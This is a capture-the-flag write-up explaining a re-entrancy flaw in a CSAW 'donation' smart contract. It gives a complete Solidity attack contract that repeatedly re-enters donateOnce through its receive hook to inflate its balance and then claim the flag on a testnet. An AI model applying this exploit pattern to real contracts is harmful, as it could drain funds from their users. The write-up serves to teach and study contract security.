This challenge was about [re-entrancy](https://solidity-by-example.org/hacks/re-entrancy/). In `donateOnce`, the call to `msg.sender.call` is made before `doneDonating[msg.sender]` is set to `true`. If we call `donation.donateOnce()` in our `receive` hook, we can "enter" the `donateOnce` body multiple times without being blocked by the if-statement. The later calls execute before the first one has a chance to complete.

```js
// SPDX-License-Identifier: MIT

pragma solidity >=0.8.7;

abstract contract CSAWDonation {
    mapping(address => uint256) public balances;
    mapping(address => bool) public doneDonating;

    function newAccount() virtual public payable;
    function donateOnce() virtual public;
    function getBalance() virtual public view returns (uint256 donatorBalance);
    function getFlag(bytes32 _token) virtual public;
}

contract CSAWDonate {
    CSAWDonation public donation;

    constructor(address donationAddress) payable {
        require(msg.value >= 0.0005 ether);
        donation = CSAWDonation(donationAddress);
    }

    receive() external payable {
        if (donation.getBalance() < 30) {
            donation.donateOnce();
        }
    }

    function main() external {
        donation.newAccount{value: 0.0001 ether}();
        donation.donateOnce();
    }

    function getFlag(bytes32 _token) external {
        donation.getFlag(_token);
    }
}
```

After constructing [our contract](https://ropsten.etherscan.io/address/0xC00d696718ae9dF26F61385570ACcd2737A8a57a) with the address of their `CSAWDonation` contract, we call `main`. This brings our balance to 30, preparing us to call `getFlag`. [Calling](https://ropsten.etherscan.io/tx/0x85d0e11f8ac9784712f95f16023c72c69be9aa8c2f50e24a24c2d7bd91b1b342) our pass-through `getFlag` with the token number from the challenge server gets us the flag.
